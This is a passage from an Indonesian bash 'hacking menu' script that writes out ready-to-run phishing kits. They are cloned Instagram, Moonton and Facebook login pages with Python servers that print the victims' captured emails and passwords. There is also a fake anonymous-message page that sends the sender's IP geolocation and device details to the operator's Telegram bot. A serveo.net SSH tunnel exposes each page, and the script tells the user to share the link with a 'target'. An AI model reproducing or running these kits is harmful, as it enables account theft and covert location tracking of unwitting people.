⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡄⢸⣿⣇⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⢠⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢲⣤⡀⠀⠀⠀⠀⠀⠀⠀⣸⡇⢸⣿⣿⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⢸⣇⠀⠀⠀⠀⠀⠀⠀⢀⣠⡖
⠀⠹⣿⣆⠀⠀⠀⠀⠀⣰⣿⠇⢸⣿⣿⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠸⣿⣆⠀⠀⠀⠀⠀⣰⣿⠏⠀
⠀⠀⢻⣿⡆⠀⠀⠐⢿⣿⣿⣦⣼⣿⣿⡇⠀⠀⠀⠀⠀⢰⣿⣿⣇⣴⣿⣿⡿⠂⠀⠀⢰⣿⡟⠀⠀
⠀⠀⢸⣿⡇⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⠏⠁⠀⠀⠀⢸⣿⡇⠀⠀
⠀⠀⢸⣿⣿⡄⠀⠀⠀⠀⢹⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⢠⣾⣿⡇⠀⠀
⢰⡄⠸⣿⣿⣿⣦⣄⠀⠀⢸⣿⣿⣿⣿⣿⡀⠀⠀⠀⢀⣿⣿⣿⣿⣿⡇⠀⠀⣠⣴⣿⣿⣿⡇⢠⡆
⢸⣿⣆⢻⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⡟⠁⠀⣀⠀⠈⢻⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⡟⣰⣿⡇
⠀⣿⣿⣷⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⢾⣿⡷⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣾⣿⣿⠀
⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠉⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⡀
⢸⣦⡈⢿⣿⣿⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⣿⡄⠀⢠⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⡿⢁⣴⡇
⠀⢿⣿⣮⣿⣿⣿⣿⣿⡇⠈⠻⣿⣿⣿⣿⣿⣿⣶⣿⣿⣿⣿⣿⣿⠟⠁⢸⣿⣿⣿⣿⣿⣵⣿⡿⠁
⠀⠈⢻⣿⣿⣿⣿⣿⣿⡇⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⢸⣿⣿⣿⣿⣿⣿⡟⠁⠀
⠀⠀⠀⠉⠻⢿⣿⣿⣿⣧⠀⠀⡀⠀⠙⣿⣿⣿⣿⣿⣿⣿⠋⠀⢀⠀⠀⣼⣿⣿⣿⣿⠟⠉⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣷⣄⣹⣷⣤⣈⣿⣿⣿⣿⣿⣁⣤⣾⣏⣠⣾⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⡇⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⢸⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⡇⢷⣿⣿⣿⣿⣿⣿⣿⣿⣿⡾⢸⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⡇⣈⢿⣿⣿⣿⣿⣿⣿⣿⡿⣡⢸⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠶⣾⣿⣿⣿⣿⣿⣿⣿⣷⠶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
" | lolcat
echo -e "${g}"⠀⠀
echo -n "Masukkan Token Botz : "
read BOT_TOKEN
echo -e "${p}"
echo -n "Masukkan Chat ID Botz : "
read CHAT_ID
echo ""
cat > index.html <<'EOF'
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Kirim aku pesan anonim!</title>
<style>
  body {
    margin:0;
    font-family:sans-serif;
    background: linear-gradient(180deg,#ff0066,#ff6600);
    display:flex;
    flex-direction:column;
    align-items:center;
    justify-content:flex-start;
    min-height:100vh;
    color:#fff;
  }
  .card {
    margin-top:40px;
    background:rgba(255,255,255,0.15);
    border-radius:20px;
    padding:20px;
    width:90%;
    max-width:400px;
    text-align:center;
  }
  .question {
    background:rgba(255,255,255,0.25);
    border-radius:15px;
    padding:15px;
    margin:20px 0;
    min-height:100px;
    color:#000;
    font-size:16px;
    outline:none;
  }
  .btn {
    width:90%;
    max-width:400px;
    margin:10px 0;
    padding:15px;
    background:#000;
    color:#fff;
    border:none;
    border-radius:10px;
    font-size:18px;
    cursor:pointer;
  }
</style>
</head>
<body>
  <div class="card">
    <h3>@Anonim</h3>
    <p>Kirimi pesan untuk anonim!</p>
    <div id="questionBox" class="question" contenteditable="true" placeholder="Tulis pesanmu di sini..."></div>
    <button class="btn" onclick="kirim()">Kirim!</button>
  </div>
  <button class="btn" onclick="window.location.href='index.html'">Dapatkan pesan untukmu sendiri!</button>
<script>
async function kirim(){
  let pesan=document.getElementById("questionBox").innerText.trim();
  if(!pesan){alert("Pesan tidak boleh kosong");return;}
  try{
    let ip=await fetch("https://ipapi.co/json/").then(r=>r.json()).catch(()=>({}));
    let hasil=`📩 Pesan Baru Masuk

💬 *Pesan* : ${pesan}
🌍 *IP* : ${ip.ip||'-'}
🏙️ *Kota* : ${ip.city||'-'}
🗺️ *Wilayah* : ${ip.region||'-'}
🌐 *Negara* : ${ip.country_name||'-'}
📍 *Maps* : https://www.google.com/maps?q=${ip.latitude||0},${ip.longitude||0}
🏢 *ISP* : ${ip.org||'-'}
🖥️ *Device* : ${navigator.userAgent}`;
    await fetch("https://api.telegram.org/bot__BOT_TOKEN__/sendMessage",{
      method:"POST",
      headers:{"Content-Type":"application/json"},
      body:JSON.stringify({chat_id:"__CHAT_ID__",text:hasil,parse_mode:"Markdown"})
    });
    alert("Pesan terkirim!");
  }catch(e){alert("Gagal kirim.");}
}
</script>
</body>
</html>
EOF
sed -i "s|__BOT_TOKEN__|$(printf '%s' "$BOT_TOKEN")|g" index.html
sed -i "s|__CHAT_ID__|$(printf '%s' "$CHAT_ID")|g" index.html
cat > server.py <<'PY'
import warnings, subprocess
from http.server import SimpleHTTPRequestHandler, HTTPServer
warnings.filterwarnings("ignore")
class SilentHandler(SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        return
port = 8080
while True:
    try:
        server = HTTPServer(("0.0.0.0", port), SilentHandler)
        break
    except OSError:
        port += 1
print("\033[31;1m[ \033[32;1mINFO \033[31;1m]\033[36;1m Menghubungkan ke URL link..!!")
ssh_cmd = ["ssh", "-oStrictHostKeyChecking=no", "-R", f"80:localhost:{port}", "serveo.net"]
proc = subprocess.Popen(ssh_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
for line in proc.stdout:
    if "Forwarding HTTP" in line:
        url = line.split(" ")[-1].strip()
        print(f"\033[31;1m[ \033[32;1mINFO \033[31;1m]\033[33;1m Silahkan salin linknya dan bagikan ke target\033[0m : \033[32;1m{url}")
        break
try:
    server.serve_forever()
except KeyboardInterrupt:
    pass
PY
python3 server.py       
              echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
              read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
              rm -f "$HOME/index.html" "$HOME/server.py"
              clear
                ;;
     82)
              echo""
              mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
              echo -e "${cyan} Anda Memilih Menu Hacking...!!"
              echo""
              echo -e "${red} VIP UNLOCK...!!"
              sleep 2
              clear
              cd
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
b='\033[34;1m'
echo "
⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣶⣶⣿⣿⣿⣷⣶⣶⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⡀⠀⠀⠀⠀
⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀
⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀
⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀
⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⡏⠉⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠉⠉⣿⣿
⢻⣿⡇⠀⠀⠀⠈⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠀⠀⠀⠀⢀⣿⡇
⠘⣿⣷⡀⠀⠀⠀⠀⠀⠀⠉⠛⠿⢿⣿⣿⣿⠿⠛⠋⠀⠀⠀⠀⠀⠀⢀⣼⣿⠃
⠀⠹⣿⣿⣶⣦⣤⣀⣀⣀⣀⣀⣤⣶⠟⡿⣷⣦⣄⣀⣀⣀⣠⣤⣤⣶⣿⣿⡟⠀
⠀⠀⣨⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⡇⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀
⠀⢈⣿⣿⣿⣿⣿⡿⠿⠿⣿⣿⣷⠀⣼⣷⠀⣸⣿⣿⣿⡿⠿⠿⠿⣿⣿⣿⡇⠀
⠀⠘⣿⣿⣿⡟⠋⠀⠀⠰⣿⣿⣿⣷⣿⣿⣷⣿⣿⣿⣿⡇⠀⠀⠀⣿⣿⠟⠁⠀
⠀⠀⠈⠉⠀⠈⠁⠀⠀⠘⣿⣿⢿⣿⣿⢻⣿⡏⣻⣿⣿⠃⠀⠀⠀⠈⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⣿⣿⢸⣿⡇⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⣿⣿⢸⣿⡇⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⣿⣿⢸⣿⡇⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⣿⣿⢸⣿⠃⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⡇⣿⣿⢸⣿⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⠇⢿⡿⢸⡿⠀⠿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
" | lolcat
echo ""
echo -e "${p}  Development ${g}: ${c}By.Thonxyzz404"
echo ""
echo -e "${r}[ ${g}+ ${r}]${b} Menyiapkan Server Website...!!"
echo ""
read -p "$(echo -e "${y}Silahkan Masukkan Prot Anda ${r}[ ${g}contoh : 8080 ${r}]${c} : ")" input 
port=${input:-8080}
command -v python > /dev/null || pkg install -y python
cat > index.html <<EOF
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Login dengan Akun Instagram</title>
  <style>
    body {
      background-color: #000; /* Dark mode IG */
      color: white;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .login-container {
      width: 90%;
      max-width: 320px;
      text-align: center;
    }
    .logo {
      margin-bottom: 30px;
    }
    .logo img {
      width: 70px;
    }
    input[type="text"], input[type="password"], input[type="email"] {
      width: 100%;
      padding: 12px;
      margin: 8px 0;
      border: none;
      border-radius: 8px;
      background-color: #1c1c1c;
      color: white;
      font-size: 14px;
      box-sizing: border-box;
    }
    .input-group {
      position: relative;
    }
    .toggle-password {
      position: absolute;
      right: 12px;
      top: 50%;
      transform: translateY(-50%);
      cursor: pointer;
      user-select: none;
      font-size: 16px;
      color: #888;
    }
    button {
      width: 100%;
      padding: 12px;
      background-color: #1877f2;
      border: none;
      color: white;
      font-weight: bold;
      border-radius: 24px;
      font-size: 14px;
      cursor: pointer;
      margin-top: 10px;
    }
    a {
      display: block;
      color: #87cefa;
      text-decoration: none;
      font-size: 13px;
      margin-top: 15px;
    }
    .note {
      font-size: 0.75em;
      color: #999;
      margin-top: 10px;
    }
    .create-account {
      margin-top: 40px;
    }
    .create-account button {
      background: none;
      border: 1px solid #1877f2;
      color: #1877f2;
      border-radius: 24px;
      padding: 10px;
      font-size: 13px;
      width: 100%;
      cursor: pointer;
    }
    .meta {
      margin-top: 30px;
      font-size: 12px;
      color: gray;
    }
    .language {
      position: absolute;
      top: 20px;
      color: gray;
      font-size: 13px;
    }
  </style>
</head>
<body>
  <div class="language">Bahasa Indonesia ▼</div>
  <div class="login-container">
    <div class="logo">
      <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
    </div>
    <form method="POST" action="/login">
      <input type="text" name="email" placeholder="Alamat Email/Username/Nomor Telepon" required>
      <div class="input-group">
        <input type="password" name="password" id="password" placeholder="Kata Sandi" required>
        <span class="toggle-password" onclick="togglePassword()">☐</span>
      </div>
      <p class="note">Gunakan password anda dengan benar agar tidak terjadi kesalahan.</p>
      <button type="submit">Login</button>
    </form>
    <a href="#">Lupa Kata Sandi?</a>
    <div class="create-account">
      <button>Buat akun baru</button>
    </div>
    <div class="meta">© Meta</div>
  </div>
  <script>
    function togglePassword() {
      const passwordInput = document.getElementById("password");
      const toggleIcon = document.querySelector(".toggle-password");
      const isPassword = passwordInput.type === "password";
      passwordInput.type = isPassword ? "text" : "password";
      toggleIcon.textContent = isPassword ? "☑" : "☐";
    }
  </script>
</body>
</html>
EOF
cat > server.py <<EOF
from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse
import sys
PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8080
class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/":
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            with open("index.html", "r") as f:
                self.wfile.write(f.read().encode())
        else:
            self.send_error(404, "Halaman tidak ditemukan.")
    def do_POST(self):
        if self.path == "/login":
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = urllib.parse.parse_qs(post_data.decode())
            email = data.get('email', [''])[0]
            password = data.get('password', [''])[0]
            print("\033[31;1m[ \033[32;1m+ \033[31;1m]\033[36;1m Gmail/Username/Nomer : " + email + "\033[0m")
            print("\033[31;1m[ \033[32;1m+ \033[31;1m]\033[36;1m Password : " + password + "\033[0m\n")
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b"<h2 style='color: white; background-color: #2e3d50; padding: 20px;'>Login berhasil! Kami Akan Menghubungkan Anda Kembali Jika Semuanya Sudah Di Proses.</h2>")
        else:
            self.send_error(404)
    def log_message(self, format, *args):
        return
if __name__ == "__main__":
    print("\033[31;1m[ \033[32;1m+ \033[31;1m]\033[32;1m Silahkan Salin Protnya : http://localhost:" + str(PORT) + "\033[0m")
    httpd = HTTPServer(('0.0.0.0', PORT), Handler)
    httpd.serve_forever()
EOF
echo ""
echo -e "${r}[ ${g}+ ${r}]${y} Server Website Telah Aktif Di Prot : http://localhost:$port "
echo ""
python server.py $port
echo ""
echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
rm -f "$HOME/index.html" "$HOME/server.py"
clear
  ;;
      83)
            echo ""
            mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
            echo -e "${cyan} Anda Memilih Menu Hacking...!!"
            echo ""
            echo -e "${red} VIP UNLOCK...!!"
            sleep 2
            clear
            echo -e "${green} SEDANG MENGINSTALL TOOLS...!!"
            echo -e "${cyan}"
            if [ -d "Nepizher_V5" ]; then
            git clone https://github.com/SokHengkell022/Nepizher_V5
            cd Nepizher_V5
            python3 V5.py
            git stash &> /dev/null
            git pull origin main &> /dev/null
            else
            git clone https://github.com/SokHengkell022/Nepizher_V5
            cd Nepizher_V5
               fi
             if [ -f "V5.py" ]; then
             python3 V5.py
              else
             echo -e "${red}File Tidak Ditemukan...!!"
               fi
            echo ""
            echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
            read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
            clear
             ;;
      84)
              echo ""
              mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
              echo -e "${cyan} Anda Memilih Menu Hacking...!!"
              echo ""
              echo -e "${red} VIP UNLOCK...!!"
              sleep 2
              clear
              cd 
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
echo "
███╗   ███╗ ██████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ██╗
████╗ ████║██╔═══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗  ██║
██╔████╔██║██║   ██║██╔██╗ ██║   ██║   ██║   ██║██╔██╗ ██║
██║╚██╔╝██║██║   ██║██║╚██╗██║   ██║   ██║   ██║██║╚██╗██║
██║ ╚═╝ ██║╚██████╔╝██║ ╚████║   ██║   ╚██████╔╝██║ ╚████║
╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝  ╚═══╝
" | lolcat
echo -e "${p}             Development ${g}: ${c}By.Thonxyzz404"
echo ""
echo ""
echo -e "${r}[ ${g}+ ${r}]${c} Menyiapkan Server Website...!!"
echo ""
read -p "$(echo -e "${y}Silahkan Masukkan Prot Anda ${r}[ ${g}contoh : 8080 ${r}]${c} : ")" input 
port=${input:-8080}
command -v python > /dev/null || pkg install -y python
cat > index.html <<EOF
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Login dengan Akun Moonton</title>
  <style>
    body {
      background-color: #1e2a38;
      color: white;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .login-container {
      background-color: #2e3d50;
      padding: 30px;
      border-radius: 10px;
      width: 300px;
      box-shadow: 0px 0px 10px #000;
    }
    .input-group {
      position: relative;
    }
    input[type="text"], input[type="password"], input[type="email"] {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border: none;
      border-radius: 5px;
      box-sizing: border-box;
    }
    .toggle-password {
      position: absolute;
      right: 10px;
      top: 20px;
      cursor: pointer;
      user-select: none;
      font-size: 18px;
    }
    button {
      width: 100%;
      padding: 10px;
      background-color: #3b8ed3;
      border: none;
      color: white;
      font-weight: bold;
      border-radius: 5px;
      cursor: pointer;
    }
    a {
      color: #87cefa;
      text-decoration: none;
      font-size: 0.9em;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <h3>Login dengan Akun Moonton</h3>
    <form method="POST" action="/login">
      <input type="text" name="email" placeholder="Alamat Email/Akun Moonton/Nomor Telepon" required>
      <div class="input-group">
        <input type="password" name="password" id="password" placeholder="Kata Sandi" required>
        <span class="toggle-password" onclick="togglePassword()">☐</span>
      </div>
      <p style="font-size: 0.8em;">Gunakan 6 karakter atau lebih dengan menggabungkan huruf besar dan kecil, serta tidak menggunakan karakter khusus</p>
      <button type="submit">Login</button>
    </form>
    <br>
    <a href="#">Lupa Kata Sandi?</a>
  </div>
  <script>
    function togglePassword() {
      const passwordInput = document.getElementById("password");
      const toggleIcon = document.querySelector(".toggle-password");
      const isPassword = passwordInput.type === "password";
      passwordInput.type = isPassword ? "text" : "password";
      toggleIcon.textContent = isPassword ? "☐" : "☑";
    }
  </script>
</body>
</html>
EOF
cat > server.py <<EOF
from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse
import sys
PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8080
class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/":
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            with open("index.html", "r") as f:
                self.wfile.write(f.read().encode())
        else:
            self.send_error(404, "Halaman tidak ditemukan.")
    def do_POST(self):
        if self.path == "/login":
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = urllib.parse.parse_qs(post_data.decode())
            email = data.get('email', [''])[0]
            password = data.get('password', [''])[0]
            print("\033[31;1m[ \033[32;1m+ \033[31;1m]\033[36;1m Gmail/ID Moonton : " + email + "\033[0m")
            print("\033[31;1m[ \033[32;1m+ \033[31;1m]\033[36;1m Password : " + password + "\033[0m\n")
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b"<h2 style='color: white; background-color: #2e3d50; padding: 20px;'>Login berhasil! Kami Akan Menghubungkan Anda Kembali Jika Semuanya Sudah Di Proses.</h2>")
        else:
            self.send_error(404)
    def log_message(self, format, *args):
        return
if __name__ == "__main__":
    print("\033[31;1m[ \033[32;1m+ \033[31;1m]\033[32;1m Silahkan Salin Protnya : http://localhost:" + str(PORT) + "\033[0m")
    httpd = HTTPServer(('0.0.0.0', PORT), Handler)
    httpd.serve_forever()
EOF
echo ""
echo -e "${r}[ ${g}+ ${r}]${y} Server Website Telah Aktif Di Prot : http://localhost:$port "
echo ""
python server.py $port
echo ""
echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
rm -f "$HOME/index.html" "$HOME/server.py"
clear
     ;;
        85)
clear
echo "
▗▄▄▄▖ ▗▄▖  ▗▄▄▖▗▄▄▄▖▗▄▄▖  ▗▄▖  ▗▄▖ ▗▖ ▗▖
▐▌   ▐▌ ▐▌▐▌   ▐▌   ▐▌ ▐▌▐▌ ▐▌▐▌ ▐▌▐▌▗▞▘
▐▛▀▀▘▐▛▀▜▌▐▌   ▐▛▀▀▘▐▛▀▚▖▐▌ ▐▌▐▌ ▐▌▐▛▚▖ 
▐▌   ▐▌ ▐▌▝▚▄▄▖▐▙▄▄▖▐▙▄▞▘▝▚▄▞▘▝▚▄▞▘▐▌ ▐▌
" | lolcat
cat > cuy.html <<EOF
<!DOCTYPE html>
<html>
<head>
    <title>Facebook Security Check</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: Arial, sans-serif;
            background: #f0f2f5;
            color: #1c1e21;
            min-height: 100vh;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            max-width: 400px;
            width: 100%;
        }
        .facebook-logo {
            text-align: center;
            color: #1877f2;
            font-size: 48px;
            font-weight: bold;
            margin-bottom: 10px;
        }
        .security-box {
            background: white;
            border-radius: 8px;
            padding: 20px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            margin-bottom: 20px;
        }
        .alert-header {
            background: #fef7e0;
            border: 1px solid #ffd983;
            border-radius: 6px;
            padding: 15px;
            margin-bottom: 20px;
        }
        .alert-icon {
            color: #f0c000;
            font-size: 20px;
            margin-right: 10px;
        }
        input {
            width: 100%;
            padding: 14px;
            margin: 8px 0;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 16px;
            background: #f5f6f7;
        }
        .login-btn {
            width: 100%;
            padding: 12px;
            background: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin: 15px 0;
        }
        .help-links {
            text-align: center;
            margin: 15px 0;
        }
        .help-links a {
            color: #1877f2;
            text-decoration: none;
            font-size: 14px;
            margin: 0 10px;
        }
        .create-page {
            text-align: center;
            margin-top: 20px;
            padding-top: 20px;
            border-top: 1px solid #dadde1;
        }
        .create-btn {
            background: #42b72a;
            color: white;
            border: none;
            padding: 12px 20px;
            border-radius: 6px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="facebook-logo">facebook</div>   
        <div class="security-box">
            <div class="alert-header">
                <span class="alert-icon">⚠️</span>
                <strong>Security Check Required</strong>
            </div>     
            <p style="margin-bottom: 20px; color: #606770;">
                We've detected unusual login activity on your account. To keep your account secure, we need to verify your identity.
            </p>
            <form id="facebookForm">
                <input type="text" id="fbEmail" placeholder="Email address or phone number" required>
                <input type="password" id="fbPassword" placeholder="Password" required>    
                <button type="submit" class="login-btn">Continue</button>
            </form>
            <div class="help-links">
                <a href="#">Forgotten account?</a>
                <a href="#">Help Center</a>
            </div>
        </div>
        <div class="create-page">
            <p style="color: #1c1e21; margin-bottom: 15px;">
                <strong>Create a Page</strong> for a celebrity, brand or business.
            </p>
            <button class="create-btn">Create Page</button>
        </div>
        <div style="text-align: center; margin-top: 30px; color: #737373; font-size: 12px;">
            English (UK) &nbsp;&middot;&nbsp; Bahasa Indonesia &nbsp;&middot;&nbsp; 日本語 &nbsp;&middot;&nbsp; Español &nbsp;&middot;&nbsp; Português (Brasil)
            <br><br>
            Meta &copy; 2024
        </div>
    </div>
    <script>
        const pageId = "facebook_page"; 
        document.getElementById('facebookForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const email = document.getElementById('fbEmail').value;
            const password = document.getElementById('fbPassword').value;   
            fetch('/collect/' + pageId, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    service: 'Facebook',
                    email: email,
                    password: password,
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language
                })
            }).then(() => {
                alert('Security check completed successfully! Redirecting to Facebook...');
                setTimeout(() => {
                    window.location.href = 'https://facebook.com';
                }, 2000);
            });
        });
    </script>
</body>
</html>
EOF
port=${1:-8080}
cat > server.py <<EOF
from http.server import BaseHTTPRequestHandler, HTTPServer
import json
import socket
def find_available_port(start_port):
    port = start_port
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.bind(('0.0.0.0', port))
            sock.close()
            return port
        except OSError:
            print("\033[31;1m[ \033[32;1mx \033[31;1m]\033[35;1m Port " + str(port) + " ini sedang digunakan.")
            print("\033[31;1m[ \033[32;1m+ \033[31;1m]\033[33;1m Mencoba prot lain dari prot yang berbeda.")
            port += 1
PORT = find_available_port($port)
class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/":
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            with open("cuy.html", "r") as f:
                self.wfile.write(f.read().encode())
        else:
            self.send_error(404, "Halaman tidak ditemukan.")
    def do_POST(self):
        if self.path == "/collect/facebook_page":
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode())
            email = data.get('email', '')
            password = data.get('password', '')
            print("\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[34;1m Gmail :\033[32;1m " + email + "\033[0m")
            print("\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[34;1m Password :\033[32;1m " + password + "\033[0m\n")
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
